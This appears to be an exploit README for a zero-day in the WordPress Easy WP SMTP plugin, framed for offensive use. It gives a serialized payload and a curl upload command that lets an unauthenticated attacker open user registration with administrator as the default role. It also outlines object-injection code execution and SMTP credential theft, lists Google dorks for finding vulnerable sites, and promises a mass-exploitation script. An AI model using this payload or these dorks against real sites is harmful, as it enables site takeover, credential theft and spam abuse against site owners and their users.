# WordPress-Easy-WP-SMTP-plugin-0day

The popular Easy WP SMTP plugin, which as 300,000+ active installations, was prone to a critical zero-day vulnerability that allowed an unauthenticated user to modify WordPress options or to inject and execute code among other malicious actions.

admin_init() function, from the easy-wp-smtp.php script, is ran via the admin_init hook when a user accesses the admin area. It is used to view/delete the log, import/export the plugin configuration and to update options in the WordPress database. It does not check the user capability, hence any logged in user, such as a subscriber, could trigger it.

# Proof of Concept:

In the following proof of concept, Its going to use swpsmtp_import_settings to upload a file that will contain a malicious serialized payload that will enable users registration (users_can_register) and set the user default role (default_role) to “administrator” in the database.

1. Create a file name “/tmp/upload.txt” and add this content to it:

> a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}

2. Upload the file:

>$ curl https://TARGET.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

Other vulnerabilities could be exploited such as:

Remote Code Execution via PHP Object Injection because Easy WP SMTP makes use of unsafe unserialize() calls.
Viewing/deleting the log (or any file, since hackers can change the log filename).
Exporting the plugin configuration which includes the SMTP host, username and password and using it to send spam emails.

3. For mass-checker vuln site list:

> Use my python script: python script.py list.txt & dont forget to install libraries (pip install module).


4. Some GOOGLE DORKS:

DORK 1 | DORK 2 | DORK 3
------------ | ------------- | -------------
inurl:'/wp-content/plugins/easy-wp-smtp/' | intext:'Index of /wp-content/plugins/easy-wp-smtp' | intext:'=== Easy WP SMTP ==='

5. Mass exploiting python script:

> Soon ;)
